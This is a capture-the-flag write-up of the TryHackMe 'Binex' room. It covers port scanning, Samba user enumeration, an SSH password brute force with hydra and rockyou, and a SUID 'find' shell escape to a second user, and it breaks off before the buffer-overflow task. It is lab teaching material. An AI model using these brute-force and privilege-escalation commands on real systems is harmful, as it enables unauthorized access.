
# Binex
This is a guest post by HiSch with notes from a challenge we did @[tryhackme](https://tryhackme.com) called [Binex](https://tryhackme.com/room/Binex).

## 0. Preparation

The IP Address of the victim machine is put into the /etc/hosts file, so you don't have to bother remembering its ip address:

```sh
~# vi /etc/hosts
xx.xx.xx.xx binex.thm
```

## 1. Task 1: Gain initial access

The first thing - like most of the time is enumeration the machine:

```sh
~# nmap -A binex.thm

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
|_  256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (EdDSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

We can see the SMB / SAMBA port 445 is open. The hint says that the RID range 1000-1003 is of special interest. It also mentions, that the longest username has a weak password - probably for bruteforcing.
enum4linux fortunately has an option for that:

```sh
~# enum4linux -R 1000-1003 binex.thm
(..)
S-1-22-1-1002 Unix User\********* (Local User)
(..)
```

Now that we know the username we can try to bruteforce the password:

```sh
~# hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://binex.thm
(..)
[22][ssh] host: binex.thm   login: <username>   password: <password>
(..)
```

You can now log on via ssh with this username/password.

```sh
~# ssh <username>@binex.thm 
```

## 2. Task 2: SUID :: Binary 1

According to the title and the question we have to use a suid file to gain access to the user des.

```sh
~# find / -perm /4000 -exec ls -ldb {} \; 2>/dev/null
(..)
-rwsr-sr-x 1 des des 238080 Nov  5  2017 /usr/bin/find
(..)
```

Apparently the /usr/bin/find is owned by des and has the SUID bit set. So lets search [GTFOBins](https://gtfobins.github.io/gtfobins/find/) for a quick solution:

```sh
~# /usr/bin/find . -exec /bin/sh -p \; -quit
$ whoami
des
$ cat /home/des/flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{<FLAG>}

login crdential (In case you need it)
username: des
password: <password>

```

## 3. Task 3: Buffer Overflow :: Binary 2

This is where it gets intreating. There is an executable file with suid bit set in the home directory of des called ~./bof. When you execute bof you are asked to enter a string and this string is echoed back to the stdout. Conveniently the source code is in the same directory (~./bof64.c).

## ...to be continued
